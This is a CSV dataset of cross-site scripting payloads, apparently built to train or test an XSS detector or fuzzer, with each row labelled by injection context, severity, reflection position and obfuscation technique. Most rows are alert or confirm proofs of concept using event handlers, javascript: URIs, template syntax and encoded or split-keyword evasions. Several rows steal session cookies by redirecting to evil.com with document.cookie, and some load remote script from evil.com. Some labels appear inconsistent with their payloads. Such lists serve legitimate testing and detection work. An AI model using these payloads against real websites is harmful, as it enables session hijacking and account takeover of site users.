payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:attribute]",attribute,medium,,,attribute,obfuscated:hex_escape
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",template_injection,low,,,script,mutated
#{\u0061\u006cert(1)},#{\u0061\u006cert(1)} [position:style],template_injection,high,,,style,obfuscated:unicode_escape
javascript:alert(1),javascript:alert(1) [position:none],attribute_escape,high,,,none,obfuscated:hex_escape
#{alert(1)},#{alert(1)} [position:none],template_injection,low,,,none,original
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e","\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e [position:script]",script_injection,medium,,,script,obfuscated:hex_escape
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",""" oNfOcUs=aLeRt(1) AuToFoCuS="" [position:attribute]",attribute,high,,,attribute,obfuscated:mixed_case
"<svG/x="">""/oNloaD=alert`1`//","<svG/x="">""/oNloaD=alert`1`// [position:comment]",attribute,medium,,,comment,mutated
<body onload=al'+'ert(1)>,<body onload=al'+'ert(1)> [position:style],event_handler,high,,,style,obfuscated:concat_split
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",template_injection,medium,,,script,original
<%= alert(1) %>,<%= alert(1) %> [position:none],js_uri,medium,,,none,obfuscated:comment_inject
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:html_body],script_injection,low,,,html_body,mutated
onload='self.alert(1)',onload='self.alert(1)' [position:html_body],html_body,medium,,,html_body,mutated
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],attribute,low,,,attribute,mutated
\' onerror=confirm(1)//,\' onerror=confirm(1)// [position:script],attribute_escape,low,,,script,mutated
<scr/**/ipt>alert(document.domain)</scr/**/ipt>,<scr/**/ipt>alert(document.domain)</scr/**/ipt> [position:script],script_injection,high,,,script,obfuscated:comment_inject
"location=""javascript:confirm(1)""","location=""javascript:confirm(1)"" [position:none]",dom_sink,high,,,none,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:style],event_handler,low,,,style,original
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:script],js_uri,low,,,script,obfuscated:tab_newline_inject
"' onerror
=alert(	1) x
='","' onerror
=alert(	1) x
=' [position:attribute]",attribute,low,,,attribute,obfuscated:tab_newline_inject
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:none]",dom_sink,high,,,none,mutated
${alert(1)},${alert(1)} [position:script],template_injection,high,,,script,obfuscated:html_entity
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],template_injection,medium,,,none,mutated
"<img src
=x onerror
=alert(	1)>","<img src
=x onerror
=alert(	1)> [position:html_body]",tag_injection,low,,,html_body,obfuscated:tab_newline_inject
"javascr/**/ipt:void(document.location=""http://evil.com"")","javascr/**/ipt:void(document.location=""http://evil.com"") [position:html_body]",js_uri,medium,,,html_body,obfuscated:comment_inject
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:attribute],template_injection,high,,,attribute,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",js_uri,low,,,html_body,original
javascript:confirm(1),javascript:confirm(1) [position:html_body],js_uri,low,,,html_body,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:html_body],attribute_escape,low,,,html_body,original
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",template_injection,medium,,,html_body,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,medium,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,high,,,script,obfuscated:concat_split
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in) [position:html_body],js_uri,medium,,,html_body,obfuscated:unicode_escape
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
<img/src/onerror=alert(1),<img/src/onerror=alert(1) [position:html_body],html_body,medium,,,html_body,none
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:script],js_uri,low,,,script,obfuscated:tab_newline_inject
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,low,,,html_body,original
"document.write(""<img src=x onload=alert(1)>"")","document.write(""<img src=x onload=alert(1)>"") [position:script]",dom_sink,high,,,script,mutated
<%= alert(1) %>,<%= alert(1) %> [position:script],attribute_escape,high,,,script,original
<script>alert(	document.domain)</script>,<script>alert(	document.domain)</script> [position:script],script_injection,high,,,script,obfuscated:tab_newline_inject
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
%3Cdetails open ontoggle=alert(1)%3E,%3Cdetails open ontoggle=alert(1)%3E [position:style],event_handler,high,,,style,obfuscated:url_encode
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:script]",script_injection,high,,,script,original
\u003cimg src onchange=alert(1)\u003e,\u003cimg src onchange=alert(1)\u003e [position:attribute],attribute,medium,,,attribute,mutated
"<img/src
=x onerror
=alert(	1)//>","<img/src
=x onerror
=alert(	1)//> [position:script]",tag_injection,medium,,,script,obfuscated:tab_newline_inject
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",script_injection,high,,,script,original
"onerror=""alert(1)""","onerror=""alert(1)"" [position:attribute]",html_body,medium,,,attribute,none
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],script_injection,medium,,,script,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,medium,,,script,mutated
<img src=x onerror=\u0061\u006cert(1)>,<img src=x onerror=\u0061\u006cert(1)> [position:html_body],tag_injection,high,,,html_body,obfuscated:unicode_escape
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:html_body]",script_injection,low,,,html_body,obfuscated:hex_escape
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:none]",js_uri,high,,,none,original
<svg onload=alert()>,<svg onload=alert()> [position:html_body],html_body,medium,,,html_body,none
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:html_body],template_injection,medium,,,html_body,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:none],event_handler,medium,,,none,original
javascript:confirm(document.domain),javascript:confirm(document.domain) [position:html_body],script_injection,medium,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,high,,,attribute,mutated
<ScRiPt>pRoMpT(1)</ScRiPt>,<ScRiPt>pRoMpT(1)</ScRiPt> [position:script],script_injection,low,,,script,obfuscated:mixed_case
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:script]",script_injection,medium,,,script,original
<svg onload=alert()>,<svg onload=alert()> [position:html_body],html_body,medium,,,html_body,none
"document.write(	""<img src
=x onerror
=alert(	1)>"")","document.write(	""<img src
=x onerror
=alert(	1)>"") [position:script]",dom_sink,medium,,,script,obfuscated:tab_newline_inject
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",dom_sink,low,,,none,original
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,high,,,style,mutated
onerror='alert(1)',onerror='alert(1)' [position:html_body],html_body,medium,,,html_body,none
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:html_body],html_body,medium,,,html_body,none
"\"" onerror=\u0061\u006cert(1)//","\"" onerror=\u0061\u006cert(1)// [position:style]",attribute_escape,low,,,style,obfuscated:unicode_escape
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:none],event_handler,medium,,,none,mutated
<marquee onstart=confirm(1)>,<marquee onstart=confirm(1)> [position:html_body],script_injection,low,,,html_body,mutated
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,low,,,html_body,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,high,,,html_body,obfuscated:comment_inject
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:html_body],template_injection,low,,,html_body,original
\x3cscript\x3ealert(1)\x3c/script\x3e,\x3cscript\x3ealert(1)\x3c/script\x3e [position:html_body],script_injection,high,,,html_body,obfuscated:hex_escape
<scr/**/ipt>alert(1)</scr/**/ipt>,<scr/**/ipt>alert(1)</scr/**/ipt> [position:html_body],script_injection,high,,,html_body,obfuscated:comment_inject
<video src=x onload=alert(1)>,<video src=x onload=alert(1)> [position:attribute],attribute,medium,,,attribute,mutated
${al'+'ert(1)},${al'+'ert(1)} [position:html_body],template_injection,medium,,,html_body,obfuscated:concat_split
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:none],event_handler,high,,,none,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,high,,,attribute,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],attribute_escape,low,,,script,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,low,,,attribute,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,high,,,html_body,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],event_handler,medium,,,html_body,original
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e","\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e [position:html_body]",js_uri,medium,,,html_body,obfuscated:hex_escape
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",attribute_escape,high,,,script,mutated
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:attribute]",attribute_escape,low,,,attribute,mutated
javaSCRIPT:alert(1),javaSCRIPT:alert(1) [position:attribute],js_uri,medium,,,attribute,mutated
onload='alert(1)',onload='alert(1)' [position:html_body],attribute,medium,,,html_body,none
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:html_body],tag_injection,low,,,html_body,obfuscated:unicode_escape
<body onload=alert(1)>,<body onload=alert(1)> [position:none],event_handler,medium,,,none,original
javascr/**/ipt:confirm(1),javascr/**/ipt:confirm(1) [position:none],js_uri,low,,,none,obfuscated:comment_inject
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:html_body],attribute_escape,high,,,html_body,original
<svg onload=alert(1)>,<svg onload=alert(1)> [position:style],attribute_escape,medium,,,style,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",dom_sink,high,,,none,original
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],js_uri,low,,,script,original
<%= confirm(1) %>,<%= confirm(1) %> [position:attribute],attribute,high,,,attribute,mutated
javascript:alert(1),javascript:alert(1) [position:style],js_uri,medium,,,style,original
"document.write(""\x3cimg src=x onerror=alert(1)\x3e"")","document.write(""\x3cimg src=x onerror=alert(1)\x3e"") [position:script]",script_injection,high,,,script,obfuscated:hex_escape
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,low,,,script,original
<BODY ONLOAD=alert(’XSS’)>,<BODY ONLOAD=alert(’XSS’)> [position:html_body],html_body,medium,,,html_body,case_variation
${alert(1)},${alert(1)} [position:attribute],template_injection,low,,,attribute,original
<script>d.innerHTML+='';</script>,<script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,none
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:style],event_handler,high,,,style,original
{{7*7}},{{7*7}} [position:style],template_injection,low,,,style,obfuscated:mixed_case
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],tag_injection,low,,,html_body,original
"' onerror
=alert(	1) x
='","' onerror
=alert(	1) x
=' [position:attribute]",attribute,medium,,,attribute,obfuscated:tab_newline_inject
onload='alert(1)',onload='alert(1)' [position:html_body],html_body,medium,,,html_body,none
"\"" onerror=al'+'ert(1)//","\"" onerror=al'+'ert(1)// [position:script]",attribute_escape,low,,,script,obfuscated:concat_split
%3Csvg/onload=alert(1)%3E,%3Csvg/onload=alert(1)%3E [position:html_body],tag_injection,low,,,html_body,obfuscated:url_encode
<script>d.innerHTML+='';</script>,<script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,none
"' onerror
=alert(	1) x
='","' onerror
=alert(	1) x
=' [position:attribute]",attribute,medium,,,attribute,obfuscated:tab_newline_inject
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,high,,,attribute,original
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,high,,,script,mutated
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,medium,,,style,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:attribute],attribute,high,,,attribute,original
"<script>d.innerHTML+&#61;'';</script>//[""'`-->]]>]</div>","<script>d.innerHTML+&#61;'';</script>//[""'`-->]]>]</div> [position:html_body]",attribute,high,,,html_body,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],attribute_escape,low,,,style,original
#{\u0061\u006cert(1)},#{\u0061\u006cert(1)} [position:style],template_injection,medium,,,style,obfuscated:unicode_escape
"""><svg onload=alert(1)>","""><svg onload=alert(1)> [position:comment]",attribute,medium,,,comment,none
